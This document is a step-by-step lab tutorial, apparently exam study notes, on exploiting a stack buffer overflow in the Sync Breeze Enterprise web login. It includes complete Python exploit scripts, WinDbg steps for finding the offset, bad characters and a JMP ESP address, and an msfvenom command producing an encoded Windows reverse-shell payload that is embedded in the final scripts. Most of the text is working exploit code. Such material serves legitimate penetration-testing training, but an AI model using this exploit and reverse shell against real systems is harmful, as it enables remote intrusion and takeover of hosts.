# 3. Exploiting Stack Overflows

## Overview

1. Crash the application (PoC)
2. Crash the application with non-repeating pattern to find the offset
3. Locate space for shellcode
4. Check for bad characters
5. Find a return address
   1.
6. Generate a shell

## Stack Overflows Introduction

A vulnerable C function

```c
#include <stdio.h> 
#include <string.h>
int main(int argc, char *argv[])
{
    char buffer[64];

    if (argc < 2)
    {
        printf("Error - You must supply at least one argument\n");

        return 1;
    }

    strcpy(buffer , argv[1]);
  
  return 0;
}
```

### Installing the Sync Breeze Application

{% code overflow="wrap" %}
```bash
# Run installer
"C:\Installers\stack_overflow\syncbreezeent_setup_v10.0.28.exe"
# Enable the web server by clicking the Options
# Select Server from the left side menu and tick the Enable Web Server on Port: option, leaving the default port as 80
```
{% endcode %}

### Crashing the Sync BreezeApplication

Copy the Python proof of concept to Kali

{% code overflow="wrap" %}
```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  inputBuffer = b"A" * size
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
{% endcode %}

```bash
# Start WinDbg as administrator
# Attach to 'C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe' process
# Start debugger with 'g' command. 
# Execute exploit
python stack_overflow_0x01.py 172.16.69.147
```

### Controlling EIP

```bash
# Generate a non-repeating string of length 800
msf-pattern_create -l 800

```

Update python script to include non-repeating string

{% code overflow="wrap" %}
```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
{% endcode %}

```bash
# Execute exploit
python stack_overflow_0x02.py 172.16.69.147
# Notice EIP is now different (42306142)
# Find where bytes occur in the buffer
msf-pattern_offset -l 800 -q 42306142
```

Update python script with known offset

{% code overflow="wrap" %}
```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  buff = b"C" * 16
  inputBuffer = filler + eip + buff
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
{% endcode %}

```
# Notice EIP is now different (42424242)
```

### Locating Space for Our Shellcode

```bash
# After previous crash look at the pointer located in the ESP
dds esp L3
# It should contain all C's (43434343)
# Looking further at memory
dds esp -10 L8
# We see
This exception may be expected and handled.
eax=00000001 ebx=00000000 ecx=0057d2ec edx=00000358 esi=00576566 edi=00e060f0
eip=42424242 esp=01a2744c ebp=005757b8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
42424242 ??              ???
0:011> dds esp L3
01a2744c  43434343
01a27450  43434343
01a27454  43434343
0:011> dds esp -10 L8
01a2743c  41414141
01a27440  41414141
01a27444  42424242
01a27448  43434343
01a2744c  43434343
01a27450  43434343
01a27454  43434343
01a27458  00df6a00
# Notice the ESP points to the 2nd set of C's (43434343)
# Also we only have 16 C's standard reverse shell requires 350 - 400 bytes of space
```

Update shell code to 1500 bytes for shellcode space using D

{% code overflow="wrap" %}
```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  offset = b"C" * 4
  shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Notice ESP now points to D character due to added C offset / D shellcode
dds esp -8 L7
# This handy trick has provided us with significantly more space to work with - specifically, 712
dds esp L4
dds esp+2c0 L4
? 01a37714 - 01a3744c

```
{% endcode %}

### Checking for Bad Characters

Common bad 0x00

If HTTP omit 0x0D

Replacing our D’s with all possible hex characters except 0x00

{% code overflow="wrap" %}
```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  offset = b"C" * 4
  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
  #shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + badchars
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# After program crash run to view characters that came through
db esp - 10 L150
# Find the first character that is missing and remove from the payload then rerun it
# Keep redoing this step until it runs successfully
# Bad chars 0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, and 0x3D
```
{% endcode %}

### Redirecting the Execution Flow

At this point, we have control of the EIP register and plenty of space for our shellcode that is easily accessible through the ESP register. We also know which characters are safe, and which are not. Our next task is to find a way to redirect the execution flow to the shellcode located at the memory address the ESP register is pointing to at the time of the crash. The most intuitive approach might be trying to replace the B’s that overwrite EIP with the address that pops up in the ESP register at the time of the crash. However, as we mentioned earlier, the value of ESP changes from crash to crash. Stack addresses change often, especially in threaded applications such as Sync Breeze, because each thread has a reserved stack region in memory allocated by the operating system. Therefore, hard-coding a specific stack address would not be a reliable way of reaching our buffer.

### Finding a Return Address

We can still store our shellcode at the address pointed to by ESP, but we need a consistent way to execute that code. One solution is to leverage a JMP ESP instruction, which as the name suggests, “jumps” to the address pointed by ESP when it executes. If we can find a reliable static address that contains this instruction, we can redirect EIP to this address. Then, at the time of the crash, the JMP ESP instruction will be executed and this “indirect jump” will direct the execution flow into our shellcode. Many support libraries in Windows contain this commonly-used instruction, but we need to find a reference that meets two important criteria. First, the address used in the library must be static, which eliminates the libraries compiled with ASLR support. Second, the address of the instruction must not contain any of the bad characters that would break the exploit, since the address will be part of our input buffer.

To determine the protections of a particular module, we can check the DllCharacteristics member of the IMAGE\_OPTIONAL\_HEADER72 structure, which is part of the IMAGE\_NT\_HEADERS73 structure. The latter can be found in the PE header74of the target module. The Portable Executable (PE) format starts with the MS DOS header,75which contains an offset to the start of the PE header at offset 0x3C. Let’s try to find the protections of the syncbrs.exe executable using the above information. We’ll start by getting the base address of the module inside WinDbg. We can use the List Loaded Module command (lm) and search for the pattern “syncbrs”. Then we use the dt command with the base address to dump the IMAGE\_DOS\_HEADER76 as shown in the Listing 70:



{% code overflow="wrap" %}
```bash
# Find the protections of the syncbrs.exe
# Getting the base address of the module (start)
lm m syncbrs
# Dump the IMAGE_DOS_HEADER
dt ntdll!_IMAGE_DOS_HEADER 0x00400000
+0x03c e_lfanew : 0n232
# Convert decimal to hex to find the offset of PE header
? 0n232 
Evaluate expression: 232 = 000000e8
# Dump the IMAGE_NT_HEADERS structure at this address
dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8
+0x018 OptionalHeader : _IMAGE_OPTIONAL_HEADER
# Offset 0x18 we have the IMAGE_OPTIONAL_HEADER structure we need that contains the DllCharacteristics field.
dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x18
+0x046 DllCharacteristics : 0
# Now we can read the current value of DllCharacteristics and find that it is 0x00. This means that the syncbrs.exe executable does not have any protections enabled such as SafeSEH77 (Structured Exception Handler Overwrite), an exploit-preventative memory protection technique, ASLR, or NXCompat (DEP protection).

# In other words, the executable has not been compiled with any memory protection schemes, and will always reliably load at the same address, making it ideal for our purposes.
```
{% endcode %}

### Process Hacker Return Address

1. Run process hacker as administrator
2. Locate the executeable in the Processes tab
3. Check mitigation policies
   1. Double click on the process
   2. Under the General tab, check mitigation policies (Click on details to confirm)
4. In the module tab of the process view the loaded dll's
5. Click on the dll and check the general tab
6. Ensure no bad characters in the address

{% code overflow="wrap" %}
```bash
# Find the opcode equivalent of JMP ESP in Kali nasm shell
msf-nasm_shell
jmp esp
# In the libssp.dll example for Syncbreeze
# Search for the JMP ESP Instruction in WinDbg
## Find libssp.dll memory range
lm m libspp
Browse full module list
start end module name
10000000 10223000 l i b s p p C (export symbols) C:\Program Files\Sync Breeze
Enterprise\bin\libspp.dll
## Search for a JMP ESP instruction using the opcodes make sure no bad chars in address
s -b 10000000 10223000 0xff 0xe4
10090c83 ff e4 0b 09 10 02 0c 09-10 24 0c 09 10 46 0c 09 .........$...F..
# Verify finding by inspecting the instructions at address 0x10090c83
u 10090c83
libspp!SCA_FileScout::GetStatusValue+0xb3:
10090c83 ffe4 jmp esp

```
{% endcode %}

Updating the eip variable to reflect this address

{% code overflow="wrap" %}
```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
{% endcode %}

```bash
# Start WinDbg as admin and attach to the process
# Create a breakpoint at the JMP ESP instruction
bp 10090c83
# Verify breakpoint
bl
# Start debugger
g
# Single step into shellcode placeholder
t
# Check the contents of the EIP to verfiy that it is 'D'
dc eip L4
```

### Generating Shellcode with Metasploit

{% code overflow="wrap" %}
```bash
# Create encoded shellcode without badchars
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.69.130 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
{% endcode %}

Resulting shellcode

{% code overflow="wrap" %}
```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  nops = b"\x90" * 10
  shellcode = bytearray(
  "\xb8\x09\xe0\x2f\xd6\xdd\xc5\xd9\x74\x24\xf4\x5d\x31\xc9"
  "\xb1\x52\x31\x45\x12\x03\x45\x12\x83\xcc\xe4\xcd\x23\x32"
        "\x0c\x93\xcc\xca\xcd\xf4\x45\x2f\xfc\x34\x31\x24\xaf\x84"
        "\x31\x68\x5c\x6e\x17\x98\xd7\x02\xb0\xaf\x50\xa8\xe6\x9e"
        "\x61\x81\xdb\x81\xe1\xd8\x0f\x61\xdb\x12\x42\x60\x1c\x4e"
        "\xaf\x30\xf5\x04\x02\xa4\x72\x50\x9f\x4f\xc8\x74\xa7\xac"
        "\x99\x77\x86\x63\x91\x21\x08\x82\x76\x5a\x01\x9c\x9b\x67"
        "\xdb\x17\x6f\x13\xda\xf1\xa1\xdc\x71\x3c\x0e\x2f\x8b\x79"
        "\xa9\xd0\xfe\x73\xc9\x6d\xf9\x40\xb3\xa9\x8c\x52\x13\x39"
        "\x36\xbe\xa5\xee\xa1\x35\xa9\x5b\xa5\x11\xae\x5a\x6a\x2a"
        "\xca\xd7\x8d\xfc\x5a\xa3\xa9\xd8\x07\x77\xd3\x79\xe2\xd6"
        "\xec\x99\x4d\x86\x48\xd2\x60\xd3\xe0\xb9\xec\x10\xc9\x41"
        "\xed\x3e\x5a\x32\xdf\xe1\xf0\xdc\x53\x69\xdf\x1b\x93\x40"
        "\xa7\xb3\x6a\x6b\xd8\x9a\xa8\x3f\x88\xb4\x19\x40\x43\x44"
        "\xa5\x95\xc4\x14\x09\x46\xa5\xc4\xe9\x36\x4d\x0e\xe6\x69"
        "\x6d\x31\x2c\x02\x04\xc8\xa7\x81\xc9\x97\xb5\xb2\xeb\x17"
        "\xbb\xf9\x65\xf1\xd1\xed\x23\xaa\x4d\x97\x69\x20\xef\x58"
        "\xa4\x4d\x2f\xd2\x4b\xb2\xfe\x13\x21\xa0\x97\xd3\x7c\x9a"
        "\x3e\xeb\xaa\xb2\xdd\x7e\x31\x42\xab\x62\xee\x15\xfc\x55"
        "\xe7\xf3\x10\xcf\x51\xe1\xe8\x89\x9a\xa1\x36\x6a\x24\x28"
        "\xba\xd6\x02\x3a\x02\xd6\x0e\x6e\xda\x81\xd8\xd8\x9c\x7b"
        "\xab\xb2\x76\xd7\x65\x52\x0e\x1b\xb6\x24\x0f\x76\x40\xc8"
        "\xbe\x2f\x15\xf7\x0f\xb8\x91\x80\x6d\x58\x5d\x5b\x36\x68"
        "\x14\xc1\x1f\xe1\xf1\x90\x1d\x6c\x02\x4f\x61\x89\x81\x65"
        "\x1a\x6e\x99\x0c\x1f\x2a\x1d\xfd\x6d\x23\xc8\x01\xc1\x44"
        "\xd9")
  shellcode+= b"D" * (1500 - len(filler) - len(eip) - len(offset) - len(shellcode))
  inputBuffer = filler + eip + offset + nops + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
{% endcode %}

Run exploit

```bash
python2.7 stack_overflow_0x07.py 172.16.69.147
```

### Improving the exploit

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.69.130 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
{% endcode %}

Improved exploit with safe exit

{% code overflow="wrap" %}
```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  nops = b"\x90" * 10
  shellcode = bytearray(
  "\xd9\xc1\xd9\x74\x24\xf4\xb8\xec\x60\x48\xc6\x5d\x31\xc9"
  "\xb1\x52\x31\x45\x17\x83\xc5\x04\x03\xa9\x73\xaa\x33\xcd"
  "\x9c\xa8\xbc\x2d\x5d\xcd\x35\xc8\x6c\xcd\x22\x99\xdf\xfd"
  "\x21\xcf\xd3\x76\x67\xfb\x60\xfa\xa0\x0c\xc0\xb1\x96\x23"
  "\xd1\xea\xeb\x22\x51\xf1\x3f\x84\x68\x3a\x32\xc5\xad\x27"
  "\xbf\x97\x66\x23\x12\x07\x02\x79\xaf\xac\x58\x6f\xb7\x51"
  "\x28\x8e\x96\xc4\x22\xc9\x38\xe7\xe7\x61\x71\xff\xe4\x4c"
  "\xcb\x74\xde\x3b\xca\x5c\x2e\xc3\x61\xa1\x9e\x36\x7b\xe6"
  "\x19\xa9\x0e\x1e\x5a\x54\x09\xe5\x20\x82\x9c\xfd\x83\x41"
  "\x06\xd9\x32\x85\xd1\xaa\x39\x62\x95\xf4\x5d\x75\x7a\x8f"
  "\x5a\xfe\x7d\x5f\xeb\x44\x5a\x7b\xb7\x1f\xc3\xda\x1d\xf1"
  "\xfc\x3c\xfe\xae\x58\x37\x13\xba\xd0\x1a\x7c\x0f\xd9\xa4"
  "\x7c\x07\x6a\xd7\x4e\x88\xc0\x7f\xe3\x41\xcf\x78\x04\x78"
  "\xb7\x16\xfb\x83\xc8\x3f\x38\xd7\x98\x57\xe9\x58\x73\xa7"
  "\x16\x8d\xd4\xf7\xb8\x7e\x95\xa7\x78\x2f\x7d\xad\x76\x10"
  "\x9d\xce\x5c\x39\x34\x35\x37\xea\xd9\x70\x45\x9a\xdb\x7a"
  "\x48\xe0\x55\x9c\x20\x06\x30\x37\xdd\xbf\x19\xc3\x7c\x3f"
  "\xb4\xae\xbf\xcb\x3b\x4f\x71\x3c\x31\x43\xe6\xcc\x0c\x39"
  "\xa1\xd3\xba\x55\x2d\x41\x21\xa5\x38\x7a\xfe\xf2\x6d\x4c"
  "\xf7\x96\x83\xf7\xa1\x84\x59\x61\x89\x0c\x86\x52\x14\x8d"
  "\x4b\xee\x32\x9d\x95\xef\x7e\xc9\x49\xa6\x28\xa7\x2f\x10"
  "\x9b\x11\xe6\xcf\x75\xf5\x7f\x3c\x46\x83\x7f\x69\x30\x6b"
  "\x31\xc4\x05\x94\xfe\x80\x81\xed\xe2\x30\x6d\x24\xa7\x51"
  "\x8c\xec\xd2\xf9\x09\x65\x5f\x64\xaa\x50\x9c\x91\x29\x50"
  "\x5d\x66\x31\x11\x58\x22\xf5\xca\x10\x3b\x90\xec\x87\x3c"
  "\xb1")
  shellcode+= b"D" * (1500 - len(filler) - len(eip) - len(offset) - len(shellcode))
  inputBuffer = filler + eip + offset + nops + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
{% endcode %}
